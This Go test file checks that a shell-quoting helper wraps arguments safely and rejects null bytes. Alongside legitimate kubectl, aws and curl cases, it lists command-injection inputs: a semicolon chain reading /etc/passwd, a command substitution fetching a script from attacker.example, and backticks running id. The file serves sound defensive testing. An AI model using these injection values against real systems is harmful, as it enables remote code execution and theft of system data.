// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2026-present Datadog, Inc.

package com_datadoghq_script

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestShellQuoteArgs_Serialization(t *testing.T) {
	tests := []struct {
		name       string
		args       []string
		wantQuoted string
		wantErr    string
	}{
		{
			name:       "legitimate kubectl rollout restart",
			args:       []string{"kubectl", "rollout", "restart", "deployment/web-api", "-n", "prod-us1"},
			wantQuoted: "'kubectl' 'rollout' 'restart' 'deployment/web-api' '-n' 'prod-us1'",
		},
		{
			name:       "legitimate aws cli with json payload",
			args:       []string{"aws", "ssm", "send-command", "--parameters", `{"commands":["systemctl restart datadog-agent"]}`},
			wantQuoted: `'aws' 'ssm' 'send-command' '--parameters' '{"commands":["systemctl restart datadog-agent"]}'`,
		},
		{
			name:       "legitimate curl with query parameters",
			args:       []string{"curl", "-sS", "https://api.example.com/v1/jobs?status=running&limit=10"},
			wantQuoted: "'curl' '-sS' 'https://api.example.com/v1/jobs?status=running&limit=10'",
		},
		{
			name:       "adversarial semicolon chain",
			args:       []string{"echo", "ok; cat /etc/passwd"},
			wantQuoted: "'echo' 'ok; cat /etc/passwd'",
		},
		{
			name:       "adversarial command substitution",
			args:       []string{"echo", "prefix$(curl attacker.example/pwn.sh)"},
			wantQuoted: "'echo' 'prefix$(curl attacker.example/pwn.sh)'",
		},
		{
			name:       "adversarial backticks",
			args:       []string{"echo", "before`id`after"},
			wantQuoted: "'echo' 'before`id`after'",
		},
		{
			name:       "adversarial with newlines and quote",
			args:       []string{"echo", "line1\nline2", `O'Hare`},
			wantQuoted: "'echo' 'line1\nline2' 'O'\\''Hare'",
		},
		{
			name:    "reject null byte in command name",
			args:    []string{"echo\x00", "hello"},
			wantErr: "argument 0 contains null byte",
		},
		{
			name:    "reject null byte in argument payload",
			args:    []string{"echo", "hello\x00world"},
			wantErr: "argument 1 contains null byte",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := shellQuoteArgs(tt.args)
			if tt.wantErr != "" {
				assert.Error(t, err)
				assert.Contains(t, err.Error(), tt.wantErr)
				assert.Empty(t, got)
				return
			}

			assert.NoError(t, err)
			assert.Equal(t, tt.wantQuoted, got)
		})
	}
}
